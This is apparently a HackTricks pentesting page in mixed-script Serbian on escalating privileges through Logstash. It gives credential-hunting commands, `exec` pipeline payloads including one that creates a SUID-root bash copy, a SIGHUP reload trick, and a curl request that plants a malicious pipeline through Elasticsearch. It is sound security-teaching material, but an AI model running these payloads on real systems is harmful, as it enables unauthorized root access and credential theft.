# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash se koristi za **prikupljanje, transformaciju i prosleđivanje logova** kroz sistem poznat kao **pipelines**. Ti pipelines se sastoje iz faza **input**, **filter** i **output**. Interesantan aspekt se pojavljuje kada Logstash radi na kompromitovanom sistemu.

### Pipeline Configuration

Pipelines se konfigurišu u fajlu **/etc/logstash/pipelines.yml**, koji navodi lokacije konfiguracija pipelines-a:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ова датотека открива где се налазе **.conf** датотеке, које садрже конфигурације pipelines. Када се користи **Elasticsearch output module**, уобичајено је да **pipelines** садрже **Elasticsearch credentials**, који често имају опсежне привилегије због потребе Logstash-а да уписује податке у Elasticsearch. Wildcards у путевима конфигурације омогућавају Logstash-у да покрене све одговарајуће pipelines у назначеном директоријуму.

Ако се Logstash покреће са `-f <directory>` уместо `pipelines.yml`, **све датотеке унутар тог директоријума се конкатенирају у лексикографском редоследу и парсирају као једна конфигурација**. Ово ствара 2 нападачке последице:

- Убацена датотека попут `000-input.conf` или `zzz-output.conf` може променити начин на који се финални pipelines саставља
- Погрешно форматирана датотека може спречити учитавање целог pipeline-а, па пажљиво валидирајте payloads пре ослањања на auto-reload

### Fast Enumeration on a Compromised Host

На систему где је Logstash инсталиран, брзо проверите:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Takođe proverite da li je lokalni monitoring API dostupan. Prema podrazumevanim podešavanjima vezuje se na **127.0.0.1:9600**, što je obično dovoljno nakon dobijanja pristupa hostu:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Ovo obično daje pipeline ID-e, runtime detalje i potvrdu da je vaš izmenjeni pipeline učitan.

Kredencijali dobijeni iz Logstash često otključavaju **Elasticsearch**, zato proverite [ovu stranicu o Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Da biste pokušali privilege escalation, prvo identifikujte korisnika pod kojim radi Logstash servis, obično korisnik **logstash**. Uverite se da ispunjavate **jedan** od sledećih kriterijuma:

- Imate **write access** na pipeline **.conf** fajl **ili**
- Fajl **/etc/logstash/pipelines.yml** koristi wildcard, i možete pisati u ciljnu fasciklu

Pored toga, **jedan** od ovih uslova mora biti ispunjen:

- Mogućnost restartovanja Logstash servisa **ili**
- Fajl **/etc/logstash/logstash.yml** ima postavljeno **config.reload.automatic: true**

Ako konfiguracija sadrži wildcard, kreiranje fajla koji odgovara tom wildcard-u omogućava izvršavanje komandi. Na primer:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Ovde, **interval** određuje učestalost izvršavanja u sekundama. U datom primeru, komanda **whoami** se pokreće svakih 120 sekundi, a njen izlaz se upisuje u **/tmp/output.log**.

Sa **config.reload.automatic: true** u **/etc/logstash/logstash.yml**, Logstash će automatski otkriti i primeniti nove ili izmenjene pipeline konfiguracije bez potrebe za restartom. Ako nema wildcard, izmene se i dalje mogu napraviti u postojećim konfiguracijama, ali se savetuje oprez da bi se izbegli prekidi.

### Pouzdaniji pipeline payloads

The `exec` input plugin i dalje radi u aktuelnim izdanjima i zahteva ili `interval` ili `schedule`. Izvršava se tako što se Logstash JVM **forking**-uje, pa ako je memorije malo vaš payload može da zakaže sa `ENOMEM` umesto da se izvrši tiho.

Praktičniji privilege-escalation payload obično je onaj koji ostavlja trajan artefakt:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Ako nemate prava za restart, ali možete poslati signal procesu, Logstash takođe podržava ponovno učitavanje okidačem **SIGHUP** na sistemima sličnim Unixu:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Imajte na umu da nije svaki plugin pogodan za reload. Na primer, **stdin** input onemogućava automatski reload, pa nemojte pretpostavljati da će `config.reload.automatic` uvek primetiti vaše izmene.

### Krađa tajni iz Logstash

Pre nego što se fokusirate samo na izvršenje koda, prikupite podatke kojima Logstash već ima pristup:

- Kredencijali u običnom tekstu se često hardkodiraju unutar `elasticsearch {}` outputs, `http_poller`, JDBC inputs, ili podešavanja vezana za cloud
- Sigurna podešavanja se mogu nalaziti u **`/etc/logstash/logstash.keystore`** ili nekom drugom `path.settings` direktorijumu
- Lozinka keystore-a se često prosleđuje putem **`LOGSTASH_KEYSTORE_PASS`**, a instalacije preko paketa obično je učitavaju iz **`/etc/sysconfig/logstash`**
- Proširenje promenljivih okruženja sa `${VAR}` se rešava pri pokretanju Logstash-a, pa vredi proveriti okruženje servisa

Korisne provere:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Ovo takođe vredi proveriti zato što je **CVE-2023-46672** pokazao da Logstash može da zabeleži osetljive informacije u logs pod određenim okolnostima. Na post-exploitation hostu, stari Logstash logs i `journald` unosi mogu zato otkriti credentials čak i ako trenutni config referencira keystore umesto da čuva secrets inline.

### Zloupotreba centralizovanog upravljanja pipeline-ovima

U nekim okruženjima, host uopšte ne oslanja na lokalne `.conf` fajlove. Ako je podešeno **`xpack.management.enabled: true`**, Logstash može povući centralno upravljane pipelines iz Elasticsearch/Kibana, i nakon uključivanja ovog moda lokalni pipeline configs više nisu izvor istine.

To znači drugačiji attack path:

1. Povratite Elastic credentials iz lokalnih Logstash settings, keystore-a ili logs
2. Proverite da li nalog ima **`manage_logstash_pipelines`** cluster privilegiju
3. Kreirajte ili zamenite centralno upravljani pipeline tako da Logstash host izvrši vaš payload pri sledećem poll intervalu

Elasticsearch API koji se koristi za ovu funkciju je:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Ovo je posebno korisno kada su lokalne datoteke samo za čitanje, ali je Logstash već registrovan da udaljeno preuzima pipeline-ove.

## Izvori

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
